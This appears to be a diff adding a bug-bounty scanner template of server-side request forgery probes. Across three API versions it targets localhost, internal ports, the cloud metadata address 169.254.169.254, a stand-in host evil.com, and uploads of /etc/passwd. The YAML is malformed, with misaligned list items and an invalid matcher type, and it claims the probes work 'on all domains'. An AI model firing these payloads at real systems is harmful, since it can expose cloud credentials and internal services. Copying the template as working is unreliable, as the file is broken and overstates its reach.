@@ -1,0 +1,148 @@
+id: ssrf-variants
+info:
+  name: SSRF Variants Template
+  author: X-BUG-BOUNTY|sangumang18@wearehackerone.com
+  description: |
+    Template with various SSRF attack variants working on all domains.
+requests:
+  - method: GET
+    paths:
+      - "/api/v1/resource?url=http://localhost"
+      - "/api/v1/resource?url=http://169.254.169.254/latest/meta-data/"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "success"
+  - method: POST
+    paths:
+      - "/api/v1/submit"
+    body:
+      - "url=http://localhost"
+      - "data=secretdata"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "submitted"
+  - method: GET
+    paths:
+      - "/api/v1/image?url=http://evil.com/malicious-image.jpg"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: content
+        content:
+          - "<img src='http://evil.com/malicious-image.jpg'>"
+  - method: POST
+    paths:
+      - "/api/v1/upload"
+    body:
+      - "file=@/etc/passwd"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "success"
+  # Add more variations as needed...
+- method: GET
+    paths:
+      - "/api/v2/resource?url=http://127.0.0.1"
+      - "/api/v2/resource?url=http://[::1]"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "success"
+  - method: POST
+    paths:
+      - "/api/v2/submit"
+    body:
+      - "url=http://127.0.0.1"
+      - "data=confidential"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "submitted"
+  - method: GET
+    paths:
+      - "/api/v2/image?url=http://evil.com/attack-image.jpg"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: content
+        content:
+          - "<img src='http://evil.com/attack-image.jpg'>"
+  - method: POST
+    paths:
+      - "/api/v2/upload"
+    body:
+      - "file=@/etc/hosts"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "success"
+  # Add more variations as needed...
+ - method: GET
+    paths:
+      - "/api/v3/resource?url=http://localhost:9090/internal"
+      - "/api/v3/resource?url=http://[::1]:9090/internal"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "success"
+  - method: POST
+    paths:
+      - "/api/v3/submit"
+    body:
+      - "url=http://localhost:9090"
+      - "data=confidential"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "submitted"
+  - method: GET
+    paths:
+      - "/api/v3/image?url=http://evil.com/attack-image.jpg"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: content
+        content:
+          - "<img src='http://evil.com/attack-image.jpg'>"
+  - method: POST
+    paths:
+      - "/api/v3/upload"
+    body:
+      - "file=@/etc/passwd"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "success"
+  # Add more variations as needed...
